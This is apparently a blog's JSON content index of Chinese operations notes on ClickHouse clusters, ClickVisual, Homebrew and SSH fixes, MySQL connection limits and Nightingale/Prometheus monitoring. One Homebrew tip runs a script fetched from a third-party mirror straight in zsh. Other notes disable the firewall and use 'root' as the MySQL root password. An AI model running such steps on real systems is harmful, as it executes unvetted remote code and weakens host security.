5000","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"pika","slug":"pika","permalink":"https://wuhaocn.github.io/tags/pika/"}]},{"title":"ClickHouse安装文档","slug":"data/clickhouse/ClickHouse安装文档","date":"2023-11-15T03:40:25.005Z","updated":"2023-11-15T03:40:25.005Z","comments":true,"path":"2023/11/15/data/clickhouse/ClickHouse安装文档/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/clickhouse/ClickHouse%E5%AE%89%E8%A3%85%E6%96%87%E6%A1%A3/","excerpt":"","text":"1.系统要求ClickHouse可以在任何具有x86_64，AArch64或PowerPC64LE CPU架构的Linux，FreeBSD或Mac OS X上运行。 1grep -q sse4_2 /proc/cpuinfo &amp;&amp; echo &quot;SSE 4.2 supported&quot; || echo &quot;SSE 4.2 not supported&quot; 2.系统结构 3.安装3.1 单机安装3.1.1 yum安装123456sudo yum install -y yum-utilssudo yum-config-manager --add-repo https://packages.clickhouse.com/rpm/clickhouse.reposudo yum install -y clickhouse-server clickhouse-clientsudo /etc/init.d/clickhouse-server startclickhouse-client # or &quot;clickhouse-client --password&quot; if you set up a password. 3.1.2 tar安装12345678910111213141516171819202122232425262728293031323334LATEST_VERSION=$(curl -s https://packages.clickhouse.com/tgz/stable/ | \\ grep -Eo &#x27;[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+&#x27; | sort -V -r | head -n 1)export LATEST_VERSIONcase $(uname -m) in x86_64) ARCH=amd64 ;; aarch64) ARCH=arm64 ;; *) echo &quot;Unknown architecture $(uname -m)&quot;; exit 1 ;;esacfor PKG in clickhouse-common-static clickhouse-common-static-dbg clickhouse-server clickhouse-clientdo curl -fO &quot;https://packages.clickhouse.com/tgz/stable/$PKG-$LATEST_VERSION-$&#123;ARCH&#125;.tgz&quot; \\ || curl -fO &quot;https://packages.clickhouse.com/tgz/stable/$PKG-$LATEST_VERSION.tgz&quot;doneexit 0tar -xzvf &quot;clickhouse-common-static-$LATEST_VERSION-$&#123;ARCH&#125;.tgz&quot; \\ || tar -xzvf &quot;clickhouse-common-static-$LATEST_VERSION.tgz&quot;sudo &quot;clickhouse-common-static-$LATEST_VERSION/install/doinst.sh&quot;tar -xzvf &quot;clickhouse-common-static-dbg-$LATEST_VERSION-$&#123;ARCH&#125;.tgz&quot; \\ || tar -xzvf &quot;clickhouse-common-static-dbg-$LATEST_VERSION.tgz&quot;sudo &quot;clickhouse-common-static-dbg-$LATEST_VERSION/install/doinst.sh&quot;tar -xzvf &quot;clickhouse-server-$LATEST_VERSION-$&#123;ARCH&#125;.tgz&quot; \\ || tar -xzvf &quot;clickhouse-server-$LATEST_VERSION.tgz&quot;sudo &quot;clickhouse-server-$LATEST_VERSION/install/doinst.sh&quot;sudo /etc/init.d/clickhouse-server starttar -xzvf &quot;clickhouse-client-$LATEST_VERSION-$&#123;ARCH&#125;.tgz&quot; \\ || tar -xzvf &quot;clickhouse-client-$LATEST_VERSION.tgz&quot;sudo &quot;clickhouse-client-$LATEST_VERSION/install/doinst.sh&quot; 3.1.3.配置 外网访问 用户名密码 3.2 集群安装3.2.1 zookeeper安装 注线上需采用非docker安装 1234docker stop zookeeperdocker rm zookeeperdocker run --privileged=true -d --name zookeeper --publish 2181:2181 -d zookeeper:3.5docker update zookeeper --restart=always 配置 zkEnv.sh 12##zkEnv.sh 文件配置ZOO_LOG4J_PROP=&quot;ERROR,CONSOLE&quot; 配置zoo.cfg 123456## 配置自动清理autopurge.purgeInterval 这个参数指定了清理频率，单位是小时，需要填写一个1或更大的整数，默认是0，表示不开启自己清理功能。autopurge.snapRetainCount 这个参数和上面的参数搭配使用，这个参数指定了需要保留的文件数目。默认是保留3个。autopurge.snapRetainCount=20 autopurge.purgeInterval=48 3.2.2 clickhouse安装123456789# 下载安装sudo yum install -y yum-utilssudo yum-config-manager --add-repo https://packages.clickhouse.com/rpm/clickhouse.reposudo yum install -y clickhouse-server clickhouse-client# 关闭防火墙systemctl stop firewalld.servicesystemctl status firewalld.service 3.2.3 集群配置 机器 分片 副本 10.41.1.199 1 1 10.41.0.114 1 2 10.41.0.158 2 1 user.xml(配置用户) users.xml config.xml(配置集群) 114-config.xml158-config.xml199-config.xml 修改存储路径 12345678910111213#先停库systemctl stop clickhouse-server.service mkdir /data1/clickhouse/chown -R clickhouse:clickhouse /data1/clickhouse/yes | cp -rf /var/lib/clickhouse /data1/clickhouse/systemctl restart clickhouse-server.service systemctl status clickhouse-server.service # 备注 采用 service clickhouse-server stop/restart 可能出错 需修改的配置 123456789101112&lt;!-- 删除较大的数据 --&gt;&lt;max_table_size_to_drop&gt;0&lt;/max_table_size_to_drop&gt;&lt;!-- 插入限制 --&gt;&lt;merge_tree&gt; &lt;parts_to_delay_insert&gt;600&lt;/parts_to_delay_insert&gt; &lt;parts_to_throw_insert&gt;600&lt;/parts_to_throw_insert&gt; &lt;max_delay_to_insert&gt;2&lt;/max_delay_to_insert&gt; &lt;max_suspicious_broken_parts&gt;5&lt;/max_suspicious_broken_parts&gt;&lt;/merge_tree&gt; 3.3.操作台 数据库 使用mysql5.7,创建数据库：clickvisual123456docker stop mysql3336docker rm mysql3336docker run --privileged=true --name mysql3336 -p 3336:3306 -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7.19docker update mysql3336 --restart=always 应用 123wget https://github.com/clickvisual/clickvisual/releases/download/v0.3.2-rc1/clickvisual-v0.3.2-rc1-linux-amd64.tar.gztar -xzvf clickvisual-v0.3.2-rc1-linux-amd64.tar.gz 修改配置 123dsn = &quot;root:root@tcp(127.0.0.1:3336)/clickvisual?charset=utf8mb4&amp;collation=utf8mb4_general_ci&amp;parseTime=True&amp;loc=Local&amp;readTimeout=1s&amp;timeout=1s&amp;writeTimeout=3s&quot;rootURL = &quot;http://localhost:19001&quot; [https://clickvisual.gocn.vip/clickvisual/02install/install-introduce.html](https://clickvisual.gocn.vip/clickvisual/02install/install-introduce.html) 5.使用5.1 本地表测试12345678910111213141516171819202122232425262728293031CREATE DATABASE IF NOT EXISTS devloglocalCREATE TABLE IF NOT EXISTS devloglocal.applog( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `severityText` String, `severityNumber` Int32, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))ENGINE = MergeTreePARTITION BY timestampORDER BY timestampSETTINGS index_granularity = 8192;INSERT INTO devloglocal.applog(`timestamp`, observedTimestamp, traceId, spanId, severityText, severityNumber, instrumentationScope, body, resource_names, resource_values, attribute_names, attribute_values)VALUES(1658217082, 1658217082, &#x27;3232&#x27;, &#x27;3232&#x27;, &#x27;INFO &#x27;, 9, &#x27;org.example.logdemo.LogTest&#x27;, &#x27; test&#x27;, [&#x27;instance&#x27;,&#x27;service&#x27;,&#x27;namespace&#x27;,&#x27;region&#x27;], [&#x27;10.3.12.55&#x27;,&#x27;app&#x27;,&#x27;biz&#x27;,&#x27;idc&#x27;], [&#x27;app&#x27;,&#x27;session&#x27;], [&#x27;3232&#x27;,&#x27;32&#x27;]);SELECT * FROM devloglocal.applog limit 0, 10 5.2 集群测试12345678910111213141516171819202122232425262728293031323334353637383940414243CREATE DATABASE IF NOT EXISTS devlog on cluster enic_clusterDROP DATABASE devloglocal on cluster enic_clusterCREATE TABLE IF NOT EXISTS devlog.applogrep on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `severityText` String, `severityNumber` Int32, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))ENGINE = ReplicatedMergeTree(&#x27;/clickhouse/tables/&#123;shard&#125;/devlog/applogrep&#x27;, &#x27;&#123;replica&#125;&#x27;)PARTITION BY timestampORDER BY timestampSETTINGS index_granularity = 8192;create table devlog.applogrep_cluster on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `severityText` String, `severityNumber` Int32, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))engine = Distributed(enic_cluster, devlog, applogrep, hiveHash(traceId));SELECT `timestamp`, observedTimestamp, traceId, spanId, severityText, severityNumber, instrumentationScope, body, resource_names, resource_values, attribute_names, attribute_valuesFROM devlog.applogrep_cluster; 5.3 其他命令123456789101112131415161718192021222324252627create table devlog.applog_cluster on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `severityText` String, `severityNumber` Int32, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))engine = Distributed(enic_cluster, devlog, applog, hiveHash(traceId));Distributed(集群名称,库名,本地表名,分片键) show tables;SELECT COUNT(*) FROM devlog.applog_cluster;select * from system.clusters 6.官方文档 https://clickhouse.com/docs/zh/getting-started/install/","categories":[{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/categories/ClickHouse/"}],"tags":[{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/tags/ClickHouse/"}]},{"title":"ClickVisual","slug":"data/clickhouse/日志可视化-ClickVisual","date":"2023-11-15T03:40:25.005Z","updated":"2023-11-15T03:40:25.005Z","comments":true,"path":"2023/11/15/data/clickhouse/日志可视化-ClickVisual/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/clickhouse/%E6%97%A5%E5%BF%97%E5%8F%AF%E8%A7%86%E5%8C%96-ClickVisual/","excerpt":"","text":"目录 快速开始 2022 Roadmap 什么是 ClickVisual 特性 技术架构 ClickVisual 使用效果 日志查询 可视化配置 增加告警规则 查看历史告警 场景支持 快速上手 使用 Docker-Compose 体验 ClickVisual Q&amp;A 代码贡献 开发环境构建 如何参与代码贡献 新增告警推送途径 应用安装 安装介绍 安装基本要求 二进制安装 Docker 安装 Kubernetes 集群安装 功能介绍 使用说明 系统设置 子路径配置 集群模式使用 已有数据表接入 ClickHouse 常用 SQL Fluent-bit 配置参考 告警功能配置说明 ClickVisual 配置说明 模板生成 应用授权 授权介绍 ClickVisual Auth Auth Proxy GitLab Oauth2 GitHub Oauth2 架构原理 石墨文档日志架构概述ClickVisual 是一个轻量级的开源日志查询、分析、报警的可视化平台，致力于提供一站式应用可靠性的可视化的解决方案。既可以独立部署使用，也可作为插件集成到第三方系统。目前是市面上唯一一款支持 ClickHouse 的类 Kibana 的业务日志查询平台。特性 支持可视化的查询面板，可查询命中条数直方图和原始日志。 支持设置日志索引功能，分析不同索引的占比情况。 支持可视化的 VS Code 风格配置中心，能够便捷地将 logagent 配置同步到 Kubernetes 集群 ConfigMap 中。 支持 GitHub 和 GitLab 授权登录。 支持 Proxy Auth 功能，能被被非常轻松的集成到第三方系统。 支持物理机、Docker、Kubernetes 部署。 支持基于 ClicHouse 日志的实时报警功能。 技术架构 ClickVisual 使用效果日志查询 可视化配置 增加告警规则 查看历史告警 场景支持 日志查询 日志报警 配置下发 快速集成","categories":[{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/categories/ClickHouse/"}],"tags":[{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/tags/ClickHouse/"}]},{"title":"ClickHouse使用文档规范","slug":"data/clickhouse/ClickHouse使用文档&规范","date":"2023-11-15T03:40:25.004Z","updated":"2023-11-15T03:40:25.005Z","comments":true,"path":"2023/11/15/data/clickhouse/ClickHouse使用文档&规范/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/clickhouse/ClickHouse%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3&%E8%A7%84%E8%8C%83/","excerpt":"","text":"1.概述1.1 概念说明 数据扩容：clickhouse分为分布式表和本地表，需统一使用分布式表 数据容灾：clickhouse具备分片和副本概念：根据业务需要创建分片和副本 数据过期：clickhouse创建数据表时需设置过期 索引：经常查询的字段需创建索引 查询：查询需携带时间范围，并且添加索引，如果不满足查询较慢 至少差别几百倍（10亿条数据，携带索引为40-50毫秒，不带索引为5-6秒）1.2 使用文档 携带索引 123456789101112131415161718192021222324252627282930313233343536373839404142DROP table devlog.applogrep1 on cluster enic_clusterDROP table devlog.applogrep_cluster1 on cluster enic_clusterCREATE TABLE devlog.applogrep1 on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `severityText` String, `severityNumber` Int32, `appKey` String, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String), INDEX traceId_idx (traceId) TYPE minmax GRANULARITY 32, INDEX appKey_idx (appKey) TYPE minmax GRANULARITY 32)ENGINE = ReplicatedMergeTree(&#x27;/clickhouse/tables/&#123;shard&#125;/devlog/applogrep1&#x27;, &#x27;&#123;replica&#125;&#x27;)PARTITION BY toYYYYMMDD(timestamp)ORDER BY timestampTTL timestamp + INTERVAL 2 DAYSETTINGS index_granularity = 8192;create table devlog.applogrep_cluster1 on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `appKey` String, `severityText` String, `severityNumber` Int32, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))engine = Distributed(enic_cluster, devlog, applogrep1, hiveHash(traceId)); 不带索引 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748DROP DATABASE devlog on cluster enic_clusterCREATE DATABASE IF NOT EXISTS devlog on cluster enic_clusterDROP TABLE devlog.applogrep on cluster enic_clusterCREATE TABLE IF NOT EXISTS devlog.applogrep on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `severityText` String, `severityNumber` Int32, `appKey` String, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))ENGINE = ReplicatedMergeTree(&#x27;/clickhouse/tables/&#123;shard&#125;/devlog/applogrep&#x27;, &#x27;&#123;replica&#125;&#x27;)PARTITION BY toYYYYMMDD(timestamp)ORDER BY timestampTTL timestamp + INTERVAL 10 DAYSETTINGS index_granularity = 8192;DELETE TABLE devlog.applogrep_cluster on cluster enic_clustercreate table devlog.applogrep_cluster on cluster enic_cluster( `timestamp` DateTime, `observedTimestamp` DateTime, `traceId` String, `spanId` String, `appKey` String, `severityText` String, `severityNumber` Int32, `instrumentationScope` String, `body` String, `resource_names` Array(String), `resource_values` Array(String), `attribute_names` Array(String), `attribute_values` Array(String))engine = Distributed(enic_cluster, devlog, applogrep, hiveHash(traceId));DELETE TABLE devlog.applogrep_cluster on cluster enic_clusterSELECT `timestamp`, observedTimestamp, traceId, spanId, severityText, severityNumber, instrumentationScope, body, resource_names, resource_values, attribute_names, attribute_valuesFROM devlog.applogrep_cluster; 1.3 常见错误 ZooKeeper differs in primary key 123456789101112Clickhouse彻底删除表, drop表后重新创建报错，Code: 342, Existing table metadata in ZooKeeper differs in primary key解决方式：在zookeeper上删除表# 进入zookeeper/bin，使用zkCli.sh脚本客户端登录zookeeper./zkCli.sh -server 127.0.0.1:2181# 删除clickhouse表节点, 老版本使用rmr删除deleteall /clickhouse/$&#123;db_name&#125;/tables/01/$&#123;table_name&#125;# 其中$&#123;db_name&#125;为待删除表所在数据库名，$&#123;table_name&#125;为待删除表名。可使用ls可查看其子节点ls /clickhouse 2.查询语法 查询语法 1234SELECT `timestamp`, observedTimestamp, traceId, spanId, appKey, severityText, severityNumber, instrumentationScope, body, resource_names, resource_values, attribute_names, attribute_valuesFROM devlog.applogrep_cluster1 WHERE timestamp &gt; &#x27;2022-07-27 14:50:21&#x27; and timestamp &lt; &#x27;2022-07-27 16:20:21&#x27; and traceId = &#x27;1658908701861&#x27; ;","categories":[{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/categories/ClickHouse/"}],"tags":[{"name":"ClickHouse","slug":"ClickHouse","permalink":"https://wuhaocn.github.io/tags/ClickHouse/"}]},{"title":"","slug":"devops/mac/升级常见问题","date":"2023-01-03T03:27:50.244Z","updated":"2023-01-03T08:05:24.100Z","comments":true,"path":"2023/01/03/devops/mac/升级常见问题/","link":"","permalink":"https://wuhaocn.github.io/2023/01/03/devops/mac/%E5%8D%87%E7%BA%A7%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"ssh升级后连接gitlab失败 查看前后版本 升级之前版本ssh -V OpenSSH_7.6p1, LibreSSL 2.6.2 升级之后版本ssh -V OpenSSH_9.0p1, LibreSSL 3.3.6 原因 OpenSSH的版本升级到8.8之后默认屏蔽了rsa算法，需要显示配置启用 处理 “~/.ssh/config”中添加如果不存在就创建一个1234# allHost *PubkeyAcceptedKeyTypes +ssh-rsa brew问题处理 一键重装更换源自动 用这个最有效1/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot; 打印当前的源cd “$(brew –repo)”git remote -vcd “$(brew –repo)/Library/Taps/homebrew/homebrew-core”git remote -v 切换为官方原始源cd “$(brew –repo)”git remote set-url origin https://github.com/Homebrew/brew.gitcd “$(brew –repo)/Library/Taps/homebrew/homebrew-core”git remote set-url origin https://github.com/Homebrew/homebrew-core.gitbrew update 切换为清华源详情请参考：https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ cd “$(brew –repo)”git remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.gitgit pullcd “$(brew –repo)/Library/Taps/homebrew/homebrew-core”git remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.gitgit pullbrew update 切换腾讯源官网列表：https://mirrors.cloud.tencent.com/ cd “$(brew –repo)”git remote set-url origin https://mirrors.cloud.tencent.com/homebrew/brew.gitcd “$(brew –repo)/Library/Taps/homebrew/homebrew-core”git remote set-url origin https://mirrors.cloud.tencent.com/homebrew/homebrew-core.gitbrew update 切换阿里源cd “$(brew –repo)”git remote set-url origin https://mirrors.aliyun.com/homebrew/brew.gitcd “$(brew –repo)/Library/Taps/homebrew/homebrew-core”git remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.gitbrew update php安装安装12345brew tap shivammathur/phpbrew install shivammathur/php/php@7.4brew link php@7.4 参考：https://phpstone.com/wiki/macOS.html 错误解决 报错fatal: not in a git directoryError: Command failed with exit 128: git 解决 12git config --global --add safe.directory /opt/homebrew/Library/Taps/homebrew/homebrew-coregit config --global --add safe.directory /opt/homebrew/Library/Taps/homebrew/homebrew-cask","categories":[],"tags":[]},{"title":"","slug":"data/mysql/MySQL连接数设置","date":"2022-10-21T03:53:38.386Z","updated":"2022-10-21T03:54:51.898Z","comments":true,"path":"2022/10/21/data/mysql/MySQL连接数设置/","link":"","permalink":"https://wuhaocn.github.io/2022/10/21/data/mysql/MySQL%E8%BF%9E%E6%8E%A5%E6%95%B0%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"查询配置show variables like ‘%connection%’;配置库max_connections 15000max_user_connections 15000独立库max_connections 5000max_user_connections 5000合并库max_connections 5000max_user_connections 5000 show global status like ‘connection’;配置库Max_used_connections 5834Max_used_connections_time 2022-09-27 15:09:15独立库Max_used_connections 2465Max_used_connections_time 2022-10-20 20:15:29合并库Max_used_connections 3129Max_used_connections_time 2022-10-21 11:29:58 修改配置123456789101112131415161718解决方式一：通过命令可以通过 set GLOBAL max_connections=100; 命令将最大连接数设置为100，此方法是即时生效的，不需要重启mysql服务。需注意的是，要通过root权限的mysql帐号才能操作，否则会报“1227 - Access denied; you need (at least one of) the SUPER privilege(s) for this operation”的错误。同时，设置max_connections最小值为1。解决方式二：修改my.cnf打开mysql的配置文件vim /etc/my.cnf，加入max_connections=100一行（如果有，直接修改值即可），然后重启服务：/etc/init.d/mysqld restart，此时生效。区别：1.通过修改配置文件，需要重启服务；而用命令修改，即时生效。2.采用修改配置文件的方式，更稳定可靠。因为如果配置文件中有max_connections=100，再去用命令修改的话，一旦重启mysql服务后，会重新以配置文件中指定的连接数为准。","categories":[],"tags":[]},{"title":"","slug":"platform/从0-1搭建通信系统","date":"2022-10-05T09:54:38.948Z","updated":"2022-10-05T09:54:38.948Z","comments":true,"path":"2022/10/05/platform/从0-1搭建通信系统/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/platform/%E4%BB%8E0-1%E6%90%AD%E5%BB%BA%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"","slug":"platform/alarm/Prometheus告警规范","date":"2022-10-05T09:54:38.947Z","updated":"2023-02-01T03:28:09.650Z","comments":true,"path":"2022/10/05/platform/alarm/Prometheus告警规范/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/platform/alarm/Prometheus%E5%91%8A%E8%AD%A6%E8%A7%84%E8%8C%83/","excerpt":"","text":"服务告警告警类型 业务指标 阈值 错误日志 容量阈值 耗时 耗时阈值 错误率 业务失败率 中间件指标 redis 耗时阈值 错误阈值 并发阈值 mysql 耗时阈值 错误阈值 并发阈值 运行状态 jvm gc耗时 老年代占比 线程 线程锁 线程大小 线程死锁 基础指标告警*","categories":[],"tags":[]},{"title":"","slug":"platform/log/日志平台建设","date":"2022-10-05T09:54:38.947Z","updated":"2022-10-05T09:54:38.947Z","comments":true,"path":"2022/10/05/platform/log/日志平台建设/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/platform/log/%E6%97%A5%E5%BF%97%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"","slug":"platform/monitor/夜莺使用手册","date":"2022-10-05T09:54:38.947Z","updated":"2022-10-05T09:54:38.947Z","comments":true,"path":"2022/10/05/platform/monitor/夜莺使用手册/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/platform/monitor/%E5%A4%9C%E8%8E%BA%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"","text":"1.系统介绍夜莺（ Nightingale ）是一款国产开源、云原生监控系统，Nightingale 在 2020.3.20 发布 v1 版本，目前是 v5 版本，从这个版本开始，与 Prometheus、VictoriaMetrics、Grafana、Telegraf、Datadog 等生态做了协同集成，力争打造国内最好用的开源运维监控系统。出自 Open-Falcon 研发团队。 文档参考 v4: http://n9e.didiyun.com/docs/intro/ v5：https://n9e.github.io/ 代码 后端：💡 https://github.com/didi/nightingale 前端：💡 https://github.com/n9e/fe-v52. 使用介绍 2.1 功能说明业务功能主要包括 监控大盘 告警规则 告警历史 组织管理 对象管理 查看监控数据，即监控大盘页面：配置告警规则的列表页面：活跃告警列表页面，即当前未恢复的告警页面： 3.详细介绍3.1 告警使用3.1.1 告警配置步骤 step1.PromSQL测试(监控看图.即时查询模块) step2.添加规则(告警管理.告警规则) step3.屏蔽规则 step3.1 （告警管理.历史告警).下方屏蔽3.1.2 告警配置规范 规则标题 规则：数据中心-业务-告警类型(阈值告警)-描述 示例：北京-错误日志-阈值告警-【错误日志大于10条/s】 规则备注： 规则标题 + 描述 告警级别 建议选择三级告警 执行频率 30 执行时长 100 预案连接 填写告警标准处理流程 生效配置 采用默认 通知配置 通知媒介 可不勾选 恢复通知 选择不启用 重复发送频率 5分钟 回调地址","categories":[],"tags":[]},{"title":"","slug":"platform/monitor/夜莺安装手册","date":"2022-10-05T09:54:38.947Z","updated":"2022-10-05T09:54:38.947Z","comments":true,"path":"2022/10/05/platform/monitor/夜莺安装手册/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/platform/monitor/%E5%A4%9C%E8%8E%BA%E5%AE%89%E8%A3%85%E6%89%8B%E5%86%8C/","excerpt":"","text":"1.介绍 prometheus n9e mysql redis 2.环境安装2.1基础环境2.1.1 mysql安装mysql 2.1.2 redis安装redis 2.2 服务安装 下载 1234567cd /optmkdir n9ecd n9ewget https://github.com/didi/nightingale/releases/download/v5.7.0/n9e-5.7.0.tar.gztar zxvf n9e-5.7.0.tar.gz n9e-server /opt/supervisord/etc/n9e-server.conf123456789101112[program:n9e-server]command = /opt/n9e/n9e serverdirectory=/opt/n9euser=rootnumprocs=1stopsignal=TERMstartretries=0autostart=trueautorestart=trueredirect_stderr=truestdout_logfile = /opt/supervisord/var/log/n9e-server.log n9e-api /opt/supervisord/etc/n9e-webapi.conf1234567891011[program:n9e-webapi]command = /opt/n9e/n9e webapidirectory=/opt/n9euser=rootnumprocs=1stopsignal=TERMstartretries=0autostart=trueautorestart=trueredirect_stderr=truestdout_logfile = /opt/supervisord/var/log/n9e-webapi.log 配置 server.conf 123``` - webapi.conf 1 supervisorctl updatesupervisorctl reload 1234- 初始化数据库- 启动 supervisorctl restart n9e-serversupervisorctl restart n9e-webapi 1## 3.服务使用 http://n9e.server.net/ 123456### 3.1 大盘配置### 3.2 告警配置## 参考- 日志查看 /opt/supervisord/var/log/n9e-webapi.log/opt/supervisord/var/log/n9e-server.log","categories":[],"tags":[]},{"title":"","slug":"platform/monitor/监控平台搭建","date":"2022-10-05T09:54:38.947Z","updated":"2022-10-05T09:54:38.947Z","comments":true,"path":"2022/10/05/platform/monitor/监控平台搭建/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/platform/monitor/%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/","excerpt":"","text":"1.概述为保证平台稳定性监控系统为相对重要的一环，结合稳定全局考虑，监控预警在平台稳定性建设中承担如下职责，在事前做好告警预案及发现潜在问题，事中快速定位问题，事后优化监控预警策略。 1.1 概述alarm负责监控数据收集，prometheus负责监控数据存储，grafana负责监控数据展示；现有监控体系告警管理配置难度较高主要存在如下问题： 告警规则配置缺少扩展性 缺乏较为灵活的告警预案 无告警历史回溯功能 缺少告警抑制功能 面向开发人员缺少易用性 不具备同比环比功能 针对上述问题进行告警平台化实施，结合现有监控体系进行告警平台化建设，形成监控预警闭环。 1.2. 系统变更1.3 监控处理流程 1.4 功能概述监控主要功能包含采集，探测，告警，恢复，能力外放 功能模块 子模块 版本 状态 备注 业务探测 akka探测 V1 http探测 V1 cmp探测 V1 指标收集 耗时 V1 并发 V1 错误率 V2 饱和度 V2 运行状态 V1 基础组件 V1 告警管理 告警规则 V1 告警预案 V1 屏蔽规则 V1 活跃告警 V1 历史告警 V1 告警展示 节点监控 V1 服务监控 V1 集群监控 V1 主业务监控 V1 告警处理 通知 V1 电话通知 V1 告警控制 V2 链路追踪 skywalking V2 开放API 告警屏蔽 V2 待讨论 告警查询 V2 待讨论 监控架构优化 业务探测 V2 指标采集 V2 告警处理 V2 高可用 n9e v1 高可用 promethus v2 高可用 模块对接 服务 V1 中间件 V2 基建 V2 基于zabbix 版本 功能概述： 完善现有告警，形成体系化告警平台 实现告警管理，告警历史，告警屏蔽，告警预案等基础支持 提升平台扩展性，支持多业务接入 1.5 对接内容 对接项 子项 版本 描述 版本 promethus promethus V1 k8s-prome.server.net 告警通知 im V1 告警通知 业务组件 日志 V1 阈值告警 jvm V1 mysql V1 redis V1 API V1 用户 V1 中间件 mysql V2 redis V2 hbase V2 kafka V2 es V2 基建 磁盘 V2 CPU V2 内存 V2 网络 V2 2.指标收集2.1 业务指标采集2.1.1 技术实现 指标采集采用alarm.client + promethus代理实现2.1.2 采集内容 业务组件 日志 阈值告警 jvm mysql redis hbase API 用户 2.2 中间件2.2.1 技术实现 中间件 mysqld_exporter,redis_exporter等中间件实现2.2.2 采集内容 类别 中间件 实现方式 备注 中间件 mysql redis hbase kafka es … 2.3 基建指标采集2.3.1 技术实现 中间件 node_exporter等中间件实现2.3.2 采集内容 基建 采用node_exporter实现 2.4 其他指标采集2.4.1 技术实现 其他业务采集 对外提供标准的promethus接口 如es之类可以做采用扩展中间层实现（grafana虽然有实现，告警整体相对单一） 3.业务探测3.1 业务探测3.1.1 技术实现 指标采用alarm.check实现 3.2 网络探测3.2.1 技术实现 采用blockbox实现类似实现 4.告警管理4.1 技术实现 考虑告警模式的灵活性采用n9e实现 任务项 n9e高可用4.2 告警内容 告警分层 业务层 组件层 中间层 基建层 多数据中心管理 多数据中心进行集中管理 多数据中心进行集中配置 4.3 告警使用4.3.1 基础操作告警配置可参考夜莺使用手册 4.3.2 开放API restful接口暴露出来 5.监控大盘5.1 技术实现 采用grafna进行大盘展示 6.链路追踪6.1 技术实现 采用skywalking实现 7.稳定性大盘 开源方案整合 集群状态 集群数据流向 各数据中心差异列表","categories":[],"tags":[]},{"title":"Netty与RPC","slug":"framework/Netty与RPC","date":"2022-10-05T09:54:38.946Z","updated":"2022-10-05T09:54:38.946Z","comments":true,"path":"2022/10/05/framework/Netty与RPC/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/framework/Netty%E4%B8%8ERPC/","excerpt":"","text":"1.Netty原理Netty是一个高性能、异步事件驱动的NIO框架，基于Java NIO提供的API实现。它提供了对TCP、UDP和文件传输的支持，作为一个异步NIO框架，Netty的所有IO操作都是异步非阻塞的，通过Future-Listener机制，用户可以方便的主动获取或通过通知机制获得IO操作结果。 2.Netty的高性能在IO编程过程中，当需要同时处理多个客户端接入请求时，可以利用多线程或IO多路复用技术进行处理。IO多路复用技术通过多个IO阻塞复用到同一个select的阻塞上，从而使得系统在单线程的情况下可以同时处理多个客户端请求。与传统的多线程/多进程模型相比，IO多路复用的最大优势是系统开销小，系统不需要创建新的额外进程或线程，也不需要维护这些进程和线程的运行，降低了系统的维护工作量，节省了系统资源。与socket类和serversocket类相对应，NIO也提供了socketchannel和serversocketchannel两种不同的套接字通道实现。 2.1 多路复用通讯方式Netty架构按照Reactor模式设计和实现， 服务端通信序列图如下 